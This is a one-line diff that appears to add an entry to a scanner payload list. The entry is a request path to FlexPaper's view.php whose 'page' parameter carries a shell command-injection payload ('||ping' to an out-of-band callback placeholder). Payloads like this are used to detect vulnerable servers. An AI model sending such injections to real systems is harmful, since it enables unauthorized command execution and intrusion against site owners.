@@ -1,0 +1,1 @@
+/ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||ping%20{{interactsh-url}}
